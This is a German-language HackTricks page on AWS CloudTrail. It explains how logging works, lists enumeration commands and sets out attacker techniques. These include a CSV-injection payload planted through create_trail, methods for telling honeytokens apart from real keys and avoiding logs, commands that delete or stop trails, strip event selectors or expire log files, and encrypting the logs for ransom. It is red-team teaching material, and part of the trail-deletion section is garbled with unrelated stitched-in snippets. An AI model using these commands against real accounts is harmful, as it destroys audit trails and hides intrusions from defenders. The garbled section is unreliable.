# AWS - CloudTrail Enum

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## **CloudTrail**

AWS CloudTrail **zeichnet Aktivit√§ten in Ihrer AWS-Umgebung auf und √ºberwacht sie**. Es erfasst detaillierte **Ereignisprotokolle**, einschlie√ülich wer was wann und von wo aus getan hat, f√ºr alle Interaktionen mit AWS-Ressourcen. Dies bietet eine Pr√ºfspur von √Ñnderungen und Aktionen, unterst√ºtzt bei der Sicherheitsanalyse, der Compliance-Pr√ºfung und der Nachverfolgung von Ressourcen√§nderungen. CloudTrail ist unerl√§sslich, um das Verhalten von Benutzern und Ressourcen zu verstehen, die Sicherheitslage zu verbessern und die Einhaltung gesetzlicher Vorschriften sicherzustellen.

Jedes protokollierte Ereignis enth√§lt:

* Den Namen der aufgerufenen API: `eventName`
* Den aufgerufenen Dienst: `eventSource`
* Die Zeit: `eventTime`
* Die IP-Adresse: `SourceIPAddress`
* Die Agenten-Methode: `userAgent`. Beispiele:
* Signing.amazonaws.com - Von AWS Management Console
* console.amazonaws.com - Root-Benutzer des Kontos
* lambda.amazonaws.com - AWS Lambda
* Die Anforderungsparameter: `requestParameters`
* Die Antwortelemente: `responseElements`

Ereignisse werden **ungef√§hr alle 5 Minuten in einer JSON-Datei in eine neue Protokolldatei geschrieben**, sie werden von CloudTrail gehalten und schlie√ülich werden Protokolldateien **ungef√§hr 15 Minuten sp√§ter an S3 geliefert**.\
CloudTrail-Protokolle k√∂nnen **√ºber Konten und Regionen hinweg aggregiert werden.**\
CloudTrail erm√∂glicht die Verwendung von **Protokolldateiintegrit√§t, um sicherzustellen, dass Ihre Protokolldateien unver√§ndert geblieben sind**, seit CloudTrail sie Ihnen geliefert hat. Es erstellt einen SHA-256-Hash der Protokolle in einer Digest-Datei. Ein SHA-256-Hash der neuen Protokolle wird jede Stunde erstellt.\
Beim Erstellen eines Trails erm√∂glichen die Ereignisausw√§hler, den Trail zu protokollieren: Management-, Daten- oder Insight-Ereignisse.

Protokolle werden in einem S3-Bucket gespeichert. Standardm√§√üig wird die serverseitige Verschl√ºsselung (SSE-S3) verwendet, sodass AWS den Inhalt f√ºr die Personen entschl√ºsselt, die darauf zugreifen k√∂nnen. F√ºr zus√§tzliche Sicherheit k√∂nnen Sie jedoch SSE mit KMS und Ihren eigenen Schl√ºsseln verwenden.

Die Protokolle werden in einem **S3-Bucket mit diesem Namensformat** gespeichert:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* Der BucketName lautet: **`aws-cloudtrail-logs-<accountid>-<random>`**
* Beispiel: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

Innerhalb jedes Ordners hat jedes Protokoll einen **Namen nach diesem Format**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

Benennungskonvention f√ºr Protokolldateien

![](<../../../../.gitbook/assets/image (122).png>)

Dar√ºber hinaus befinden sich **Digest-Dateien (zur √úberpr√ºfung der Dateiintegrit√§t)** im **gleichen Bucket** in:

![](<../../../../.gitbook/assets/image (195).png>)

### Protokolle aus mehreren Konten aggregieren

* Erstellen Sie einen Trail im AWS-Konto, in dem die Protokolldateien geliefert werden sollen
* Wenden Sie Berechtigungen auf den Ziel-S3-Bucket an, um den plattform√ºbergreifenden Zugriff f√ºr CloudTrail zu erm√∂glichen, und erlauben Sie jedem AWS-Konto, das Zugriff ben√∂tigt
* Erstellen Sie einen neuen Trail in den anderen AWS-Konten und w√§hlen Sie den in Schritt 1 erstellten Bucket aus

Auch wenn Sie alle Protokolle im selben S3-Bucket speichern k√∂nnen, k√∂nnen Sie CloudTrail-Protokolle aus mehreren Konten nicht in einem CloudWatch Logs aggregieren, das zu einem einzigen AWS-Konto geh√∂rt.

{% hint style="danger" %}
Denken Sie daran, dass ein Konto **verschiedene Trails** von CloudTrail **aktiviert** haben kann, die dieselben (oder unterschiedliche) Protokolle in verschiedenen Buckets speichern.
{% endhint %}

### CloudTrail von allen Org-Konten in 1

Beim Erstellen eines CloudTrail ist es m√∂glich, anzugeben, dass CloudTrail f√ºr alle Konten in der Organisation aktiviert wird und die Protokolle in nur einem Bucket gespeichert werden:

<figure><img src="../../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

Auf diese Weise k√∂nnen Sie CloudTrail in allen Regionen aller Konten einfach konfigurieren und die Protokolle in einem Konto zentralisieren (das Sie sch√ºtzen sollten).

### √úberpr√ºfung der Protokolldateien

Sie k√∂nnen √ºberpr√ºfen, ob die Protokolle nicht ver√§ndert wurden, indem Sie ausf√ºhren

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### Logs zu CloudWatch

**CloudTrail kann automatisch Logs an CloudWatch senden, sodass Sie Alarme einrichten k√∂nnen, die Sie warnen, wenn verd√§chtige Aktivit√§ten durchgef√ºhrt werden.**\
Beachten Sie, dass eine **Rolle** erstellt werden muss, die diese Aktion erlaubt, damit CloudTrail die Logs an CloudWatch senden kann. Wenn m√∂glich, wird empfohlen, die Standardrolle von AWS f√ºr diese Aktionen zu verwenden. Diese Rolle erm√∂glicht es CloudTrail:

* CreateLogStream: Dies erlaubt das Erstellen von CloudWatch Logs Log-Streams
* PutLogEvents: √úbermittelt CloudTrail-Logs an CloudWatch Logs Log-Stream

### Event History

CloudTrail Event History erm√∂glicht es Ihnen, die aufgezeichneten Logs in einer Tabelle zu inspizieren:

![](<../../../../.gitbook/assets/image (89).png>)

### Insights

**CloudTrail Insights** analysiert automatisch **Schreibverwaltungsereignisse** von CloudTrail-Trails und **warnt** Sie vor **ungew√∂hnlichen Aktivit√§ten**. Zum Beispiel, wenn es eine Zunahme von `TerminateInstance`-Ereignissen gibt, die von den etablierten Baselines abweichen, sehen Sie dies als ein Insight-Ereignis. Diese Ereignisse machen **das Finden und Reagieren auf ungew√∂hnliche API-Aktivit√§ten einfacher** als je zuvor.

Die Insights werden im selben Bucket wie die CloudTrail-Logs gespeichert in: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### Sicherheit

| CloudTrail Log File Integrity        | <ul><li>√úberpr√ºfen, ob Logs manipuliert wurden (modifiziert oder gel√∂scht)</li><li><p>Verwendet Digest-Dateien (erstellt Hash f√ºr jede Datei)</p><ul><li>SHA-256-Hashing</li><li>SHA-256 mit RSA f√ºr digitale Signatur</li><li>privater Schl√ºssel im Besitz von Amazon</li></ul></li><li>Erstellt jede Stunde eine Digest-Datei (jede Stunde zur vollen Stunde)</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Unbefugten Zugriff verhindern        | <ul><li><p>Verwenden Sie IAM-Richtlinien und S3-Bucket-Richtlinien</p><ul><li>Sicherheitsteam ‚Äî> Admin-Zugriff</li><li>Pr√ºfer ‚Äî> Nur-Lese-Zugriff</li></ul></li><li>Verwenden Sie SSE-S3/SSE-KMS, um die Logs zu verschl√ºsseln</li></ul>                                                                                                                                        |
| Verhindern, dass Log-Dateien gel√∂scht werden | <ul><li>Beschr√§nken Sie den L√∂schzugriff mit IAM- und Bucket-Richtlinien</li><li>Konfigurieren Sie S3 MFA-Delete</li><li>√úberpr√ºfen Sie mit Log File Validation</li></ul>                                                                                                                                                                                            |

## Access Advisor

AWS Access Advisor basiert auf den letzten 400 Tagen AWS **CloudTrail-Logs, um seine Erkenntnisse zu sammeln**. CloudTrail erfasst eine Historie von AWS API-Aufrufen und verwandten Ereignissen, die in einem AWS-Konto gemacht wurden. Access Advisor nutzt diese Daten, um **zu zeigen, wann Dienste zuletzt genutzt wurden**. Durch die Analyse der CloudTrail-Logs kann Access Advisor bestimmen, welche AWS-Dienste ein IAM-Benutzer oder eine Rolle genutzt hat und wann dieser Zugriff erfolgte. Dies hilft AWS-Administratoren, fundierte Entscheidungen √ºber **die Verfeinerung von Berechtigungen** zu treffen, da sie Dienste identifizieren k√∂nnen, die √ºber l√§ngere Zeitr√§ume nicht genutzt wurden, und potenziell zu breite Berechtigungen basierend auf realen Nutzungsmustern reduzieren k√∂nnen.

{% hint style="success" %}
Daher informiert Access Advisor √ºber **die unn√∂tigen Berechtigungen, die Benutzern gegeben werden**, sodass der Administrator sie entfernen kann.
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

## Aktionen

### Enumeration
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSV Injection**

Es ist m√∂glich, eine CSV-Injection innerhalb von CloudTrail durchzuf√ºhren, die beliebigen Code ausf√ºhrt, wenn die Protokolle in CSV exportiert und mit Excel ge√∂ffnet werden.\
Der folgende Code erzeugt einen Protokolleintrag mit einem fehlerhaften Trail-Namen, der die Nutzlast enth√§lt:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
F√ºr weitere Informationen √ºber CSV-Injections besuchen Sie die Seite:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

F√ºr weitere Informationen √ºber diese spezielle Technik besuchen Sie [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **Erkennung umgehen**

### HoneyTokens **umgehen**

Honeytokens werden erstellt, um **die Exfiltration sensibler Informationen zu erkennen**. Im Falle von AWS sind es **AWS-Schl√ºssel, deren Nutzung √ºberwacht wird**. Wenn etwas eine Aktion mit diesem Schl√ºssel ausl√∂st, muss jemand diesen Schl√ºssel gestohlen haben.

Allerdings verwenden Honeytokens wie die von [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren) entweder erkennbare Kontonamen oder dieselbe AWS-Konto-ID f√ºr alle ihre Kunden. Wenn Sie also den Kontonamen und/oder die Konto-ID erhalten k√∂nnen, ohne dass Cloudtrail ein Protokoll erstellt, **k√∂nnten Sie wissen, ob der Schl√ºssel ein Honeytoken ist oder nicht**.

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) hat einige Regeln, um zu erkennen, ob ein Schl√ºssel zu [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)** geh√∂rt:**

* Wenn **`canarytokens.org`** im Rollennamen erscheint oder die Konto-ID **`534261010715`** in der Fehlermeldung erscheint.
* Bei neueren Tests verwenden sie die Konto-ID **`717712589309`** und haben immer noch die Zeichenfolge **`canarytokens.com`** im Namen.
* Wenn **`SpaceCrab`** im Rollennamen in der Fehlermeldung erscheint.
* **SpaceSiren** verwendet **uuids** zur Generierung von Benutzernamen: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* Wenn der **Name wie zuf√§llig generiert aussieht**, besteht eine hohe Wahrscheinlichkeit, dass es sich um einen HoneyToken handelt.

#### Die Konto-ID aus der Schl√ºssel-ID erhalten

Sie k√∂nnen die **Konto-ID** aus der **codierten** Information im **Zugriffsschl√ºssel** wie [**hier erkl√§rt**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) erhalten und die Konto-ID mit Ihrer Liste von Honeytokens AWS-Konten √ºberpr√ºfen:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
Check more information in the [**orginal research**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489).

#### Kein Log erzeugen

Die effektivste Technik hierf√ºr ist eigentlich eine einfache. Verwenden Sie einfach den Schl√ºssel, den Sie gerade gefunden haben, um auf einen Dienst in Ihrem eigenen Angreifer-Konto zuzugreifen. Dies wird **CloudTrail dazu bringen, ein Log in IHREM EIGENEN AWS-Konto zu erzeugen und nicht im Konto des Opfers**.

Das Ergebnis wird Ihnen einen Fehler anzeigen, der die Konto-ID und den Kontonamen angibt, sodass **Sie sehen k√∂nnen, ob es sich um einen Honeytoken handelt**.

#### AWS-Dienste ohne Logs

In der Vergangenheit gab es einige **AWS-Dienste, die keine Logs an CloudTrail senden** (finden Sie eine [Liste hier](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). Einige dieser Dienste werden **mit einem Fehler antworten**, der die **ARN der Schl√ºsselrolle** enth√§lt, wenn jemand Unbefugtes (der Honeytoken-Schl√ºssel) versucht, darauf zuzugreifen.

Auf diese Weise kann ein **Angreifer die ARN des Schl√ºssels erhalten, ohne ein Log auszul√∂sen**. In der ARN kann der Angreifer die **AWS-Konto-ID und den Namen** sehen. Es ist einfach, die Konto-IDs und Namen der HoneyToken-Unternehmen zu erkennen, sodass ein Angreifer auf diese Weise feststellen kann, ob der Token ein HoneyToken ist.

![](<../../../../.gitbook/assets/image (93).png>)

{% hint style="danger" %}
Beachten Sie, dass alle √∂ffentlichen APIs, die entdeckt wurden, keine CloudTrail-Logs zu erstellen, jetzt behoben sind. M√∂glicherweise m√ºssen Sie also Ihre eigenen finden...

F√ºr weitere Informationen siehe die [**original research**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).
{% endhint %}

### Zugriff auf Dritte Infrastruktur

Bestimmte AWS-Dienste werden **einige Infrastrukturen bereitstellen**, wie **Datenbanken** oder **Kubernetes**-Cluster (EKS). Ein Benutzer, der **direkt mit diesen Diensten spricht** (wie die Kubernetes-API), **wird die AWS-API nicht verwenden**, sodass CloudTrail diese Kommunikation nicht sehen kann.

Daher k√∂nnte ein Benutzer mit Zugriff auf EKS, der die URL der EKS-API entdeckt hat, lokal ein Token generieren und **direkt mit dem API-Dienst sprechen, ohne von CloudTrail entdeckt zu werden**.

Mehr Infos in:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### CloudTrail-Konfiguration √§ndern

#### Trails l√∂schen
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Stop trails

```bash
aws cloudtrail stop-logging --name <trail_name>
```

#### Start trails

```bash
aws cloudtrail start-logging --name <trail_name>
```

#### Liste der Trails

```bash
aws cloudtrail describe-trails
```

#### CloudTrail Logs

```bash
aws cloudtrail lookup-events
```

#### CloudTrail Logs f√ºr eine bestimmte Ressource

```bash
aws cloudtrail lookup-events --lookup-attributes AttributeKey=ResourceName,AttributeValue=<resource_name>
```

#### CloudTrail Logs f√ºr eine bestimmte Benutzeraktion

```bash
aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=<username>
```

#### CloudTrail Logs f√ºr eine bestimmte Event-ID

```bash
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventId,AttributeValue=<event_id>
```

#### CloudTrail Logs f√ºr eine bestimmte Event-Quelle

```bash
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventSource,AttributeValue=<event_source>
```

#### CloudTrail Logs f√ºr eine bestimmte Event-Zeit

```bash
aws cloudtrail lookup-events --start-time <start_time> --end-time <end_time>
```

#### CloudTrail Logs f√ºr eine bestimmte Event-Namen

```bash
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=<event_name>
```

#### CloudTrail Logs f√ºr eine bestimmte Event-Region

```bash
aws cloudtrail lookup-events --lookup-attributes AttributeKey=AWSRegion,AttributeValue=<region>
```

#### CloudTrail Logs f√ºr eine bestimmte IP-Adresse

```bash
aws cloudtrail lookup-events --lookup-attributes AttributeKey=SourceIPAddress,AttributeValue=<ip_address>
```
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### Deaktivieren des Multi-Region-Loggings

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
{% endcode %}

#### Deaktivieren der Protokollierung durch Ereignisausw√§hler

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

Im ersten Beispiel wird ein einzelner Ereignis-Selektor als JSON-Array mit einem einzelnen Objekt bereitgestellt. Das `"ReadWriteType": "ReadOnly"` gibt an, dass der **Ereignis-Selektor nur Leseereignisse erfassen soll** (CloudTrail Insights **werden also keine Schreibereignisse √ºberpr√ºfen**, zum Beispiel).

Sie k√∂nnen den Ereignis-Selektor basierend auf Ihren spezifischen Anforderungen anpassen.

#### Protokoll-L√∂schung √ºber S3-Lebenszyklusrichtlinie

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### √Ñndern der Bucket-Konfiguration

* L√∂schen des S3-Buckets
* √Ñndern der Bucket-Richtlinie, um jegliche Schreibvorg√§nge vom CloudTrail-Dienst zu verweigern
* Hinzuf√ºgen einer Lebenszyklus-Richtlinie zum S3-Bucket, um Objekte zu l√∂schen
* Deaktivieren des KMS-Schl√ºssels, der zum Verschl√ºsseln der CloudTrail-Protokolle verwendet wird

### Cloudtrail Ransomware

#### S3 Ransomware

Du k√∂nntest **einen asymmetrischen Schl√ºssel generieren** und **CloudTrail die Daten mit diesem Schl√ºssel verschl√ºsseln lassen** und **den privaten Schl√ºssel l√∂schen**, sodass die CloudTrail-Inhalte nicht wiederhergestellt werden k√∂nnen.\
Dies ist im Grunde eine **S3-KMS Ransomware**, wie erkl√§rt in:

{% content-ref url="../../aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMS Ransomware**

Dies ist eine einfachere M√∂glichkeit, den vorherigen Angriff mit unterschiedlichen Berechtigungsanforderungen durchzuf√ºhren:

{% content-ref url="../../aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **Referenzen**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
